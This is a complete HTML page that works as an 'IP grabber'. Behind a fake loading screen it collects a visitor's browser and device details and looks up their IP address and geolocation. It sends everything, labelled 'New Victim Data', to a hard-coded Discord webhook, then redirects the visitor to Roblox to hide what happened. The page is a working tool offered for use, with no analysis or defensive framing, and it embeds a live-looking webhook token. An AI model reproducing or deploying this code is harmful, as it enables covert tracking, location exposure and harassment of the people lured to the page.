<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #00ffcc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 30px; font-size: 18px; color: #888; }
        #status { color: #00ff88; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Establishing secure connection...</p>
    <div id="status">⏳ Collecting system data...</div>
 
    <script>
        // ============================================================
        // DISCORD WEBHOOK URL (YOURS)
        // ============================================================
        const DISCORD_WEBHOOK = 
"https://discord.com/api/webhooks/1539349646890238005/qZgoiL7CBgAHT9Bhy59RxljXGpCAhnlPy78m_HSBHJrevQ4_5hvggFU_2khuD0Chs3OM";
 
        (function() {
            // Collect all data
            function collectData() {
                return {
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    screenColorDepth: window.screen.colorDepth,
                    windowWidth: window.innerWidth,
                    windowHeight: window.innerHeight,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    referrer: document.referrer || 'direct',
                    pageURL: window.location.href,
                    hostname: window.location.hostname,
                    pathname: window.location.pathname,
                    ip: 'pending',
                    country: 'pending',
                    city: 'pending',
                    isp: 'pending',
                    latitude: 'pending',
                    longitude: 'pending'
                };
            }
 
            // Fetch IP & geolocation
            function fetchIPInfo() {
                return fetch('https://ipapi.co/json/')
                    .then(r => r.json())
                    .then(d => ({
                        ip: d.ip || 'unknown',
                        country: d.country_name || 'unknown',
                        city: d.city || 'unknown',
                        region: d.region || 'unknown',
                        isp: d.org || 'unknown',
                        timezone: d.timezone || 'unknown',
                        latitude: d.latitude || 'unknown',
                        longitude: d.longitude || 'unknown'
                    }))
                    .catch(() => fetch('https://api.ipify.org?format=json')
                        .then(r => r.json())
                        .then(d => ({
                            ip: d.ip || 'unknown',
                            country: 'unknown',
                            city: 'unknown',
                            region: 'unknown',
                            isp: 'unknown',
                            timezone: 'unknown',
                            latitude: 'unknown',
                            longitude: 'unknown'
                        }))
                        .catch(() => ({
                            ip: 'unknown',
                            country: 'unknown',
                            city: 'unknown',
                            region: 'unknown',
                            isp: 'unknown',
                            timezone: 'unknown',
                            latitude: 'unknown',
                            longitude: 'unknown'
                        }))
                    );
            }
 
            // Send to Discord webhook
            function sendToDiscord(data) {
                const embed = {
                    title: "📡 New Victim Data",
                    color: 0x00ff88,
                    fields: [
                        { name: "🌐 IP Address", value: data.ip || 'unknown', inline: true },
                        { name: "📍 Country", value: data.country || 'unknown', inline: true },
                        { name: "🏙️ City", value: data.city || 'unknown', inline: true },
                        { name: "📡 ISP", value: data.isp || 'unknown', inline: true },
                        { name: "🕒 Timezone", value: data.timezone || 'unknown', inline: true },
                        { name: "🗺️ Coordinates", value: data.latitude + ', ' + data.longitude, inline: true },
                        { name: "🖥️ Platform", value: data.platform || 'unknown', inline: true },
                        { name: "🌍 Language", value: data.language || 'unknown', inline: true },
                        { name: "📱 Screen", value: data.screenWidth + 'x' + data.screenHeight, inline: true },
                        { name: "🧠 CPU Cores", value: String(data.hardwareConcurrency), inline: true },
                        { name: "💾 RAM (GB)", value: String(data.deviceMemory), inline: true },
                        { name: "🔗 Page URL", value: data.pageURL || 'unknown', inline: false },
                        { name: "📎 Referrer", value: data.referrer || 'direct', inline: false },
                        { name: "🆔 User Agent", value: data.userAgent || 'unknown', inline: false }
                    ],
                    footer: { text: "NullCore IP Grabber • " + data.timestamp }
                };
 
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                }).catch(() => {});
            }
 
            // Execute
            document.getElementById('status').textContent = '📡 Fetching IP address...';
            fetchIPInfo().then(ipInfo => {
                const data = collectData();
                Object.assign(data, ipInfo);
                document.getElementById('status').textContent = '✅ Data sent to Discord. Redirecting...';
                sendToDiscord(data);
                // Redirect after 3 seconds
                setTimeout(() => { window.location.href = "https://www.roblox.com"; }, 3000);
            });
 
        })();
    </script>
</body>
</html>
